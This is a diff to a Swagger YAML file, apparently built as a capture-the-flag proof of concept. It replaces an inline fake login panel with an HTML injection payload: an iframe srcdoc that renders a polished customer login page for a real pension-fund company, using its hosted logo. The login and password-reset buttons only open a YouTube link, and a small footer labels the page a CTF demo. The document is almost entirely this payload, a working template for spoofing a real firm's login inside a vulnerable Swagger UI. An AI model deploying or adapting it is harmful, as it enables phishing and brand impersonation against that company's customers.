@@ -1,71 +1,125 @@
 swagger: "2.0"
 info:
-  title: |
-    🔒 CTF – Simulación de Login Realista
-  version: "2.1"
+  title: 🔐 CTF Swagger HTML Injection
+  version: "3.0"
   description: |
-    <!-- Panel de login realista para pruebas CTF -->
-    <div style="max-width:400px;margin:20px auto;padding:25px;
-       border:1px solid #ccc;border-radius:10px;
-       box-shadow:0px 8px 18px rgba(0,0,0,0.15);
-       font-family:Arial,sans-serif;">
+    <h2 style="color:#b30000">CTF – Login Renderizado vía IFRAME</h2>
 
-      <!-- Logo -->
-      <div style="text-align:center;margin-bottom:15px;">
-        <img src="https://www.afpsiembra.com/media/54pdmbwv/main-logo.png"
-             alt="Logo Demo"
-             style="max-width:200px;">
-      </div>
+    <iframe
+      style="width:100%;height:520px;border:0;box-shadow:0 10px 30px rgba(0,0,0,.3)"
+      srcdoc='
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+  body {
+    margin:0;
+    background:#f2f4f7;
+    font-family: Arial, sans-serif;
+  }
+  .login-box {
+    width:380px;
+    margin:40px auto;
+    background:white;
+    padding:30px;
+    border-radius:12px;
+    box-shadow:0 10px 25px rgba(0,0,0,.2);
+  }
+  .logo {
+    text-align:center;
+    margin-bottom:20px;
+  }
+  .logo img {
+    max-width:220px;
+  }
+  h2 {
+    text-align:center;
+    color:#003865;
+    margin-bottom:20px;
+  }
+  input {
+    width:100%;
+    padding:12px;
+    margin-bottom:14px;
+    border-radius:6px;
+    border:1px solid #bbb;
+    font-size:15px;
+  }
+  button {
+    width:100%;
+    padding:12px;
+    background:#003865;
+    color:white;
+    border:none;
+    border-radius:6px;
+    font-size:16px;
+    cursor:pointer;
+  }
+  button:hover {
+    background:#002a4d;
+  }
+  .links {
+    margin-top:15px;
+    text-align:center;
+    font-size:13px;
+  }
+  .links a {
+    color:#003865;
+    text-decoration:none;
+  }
+  .ctf {
+    margin-top:18px;
+    font-size:11px;
+    text-align:center;
+    color:#888;
+  }
+</style>
+</head>
 
-      <h2 style="text-align:center;color:#333;margin-bottom:10px;">
-        Portal de Acceso – Demo CTF
-      </h2>
-
-      <!-- Inputs -->
-      <input class="ctf-input"
-        placeholder="Usuario o correo"
-        style="width:100%;padding:12px;margin-bottom:12px;
-               border:1px solid #aaa;border-radius:6px;
-               font-size:15px;">
-
-      <input class="ctf-input"
-        type="password"
-        placeholder="Contraseña"
-        style="width:100%;padding:12px;margin-bottom:15px;
-               border:1px solid #aaa;border-radius:6px;
-               font-size:15px;">
-
-      <!-- Buttons -->
-      <button onclick="window.open('https://youtu.be/rscOXVuaCGw','loginPopup','width=850,height=650')"
-        style="width:100%;padding:12px;
-               background:#0066a1;color:white;
-               font-size:16px;border:none;
-               border-radius:6px;cursor:pointer;
-               margin-bottom:8px;">
-        Ingresar
-      </button>
-
-      <button onclick="location.href='https://youtu.be/rscOXVuaCGw'"
-        style="width:100%;padding:12px;
-               background:#444;color:white;
-               font-size:15px;border:none;
-               border-radius:6px;cursor:pointer;">
-        ¿Olvidaste la contraseña?
-      </button>
-
-      <!-- Footer CTF -->
-      <div style="text-align:center;font-size:12px;color:#777;margin-top:12px;">
-        ⚠️ Este panel es DEMO CTF – No captura datos reales
-      </div>
+<body>
+  <div class="login-box">
+    <div class="logo">
+      <img src="https://www.afpsiembra.com/media/54pdmbwv/main-logo.png">
     </div>
 
+    <h2>Acceso a Clientes</h2>
+
+    <input placeholder="Usuario o documento">
+    <input type="password" placeholder="Contraseña">
+
+    <button onclick="
+      window.open(
+        &quot;https://youtu.be/rscOXVuaCGw&quot;,
+        &quot;ctfPopup&quot;,
+        &quot;width=900,height=650&quot;
+      )">
+      Ingresar
+    </button>
+
+    <div class="links">
+      <a href="https://youtu.be/rscOXVuaCGw" target="_blank">
+        ¿Olvidaste tu contraseña?
+      </a>
+    </div>
+
+    <div class="ctf">
+      ⚠️ DEMO CTF – HTML Injection / XSS PoC
+    </div>
+  </div>
+</body>
+</html>
+'>
+    </iframe>
+
 paths:
-  /login-demo:
+  /iframe-login:
     get:
-      summary: Simulación de Login Realista
+      summary: Login realista renderizado con iframe
       description: |
-        Este endpoint muestra un panel de login simulado
-        con redirecciones y ventanas para pruebas CTF de XSS/HTML Injection.
+        Este endpoint demuestra cómo HTML Injection
+        permite renderizar interfaces completas
+        usando iframe/srcdoc en Swagger UI vulnerable.
       responses:
         '200':
-          description: Demo de panel de login
+          description: iframe injection successful
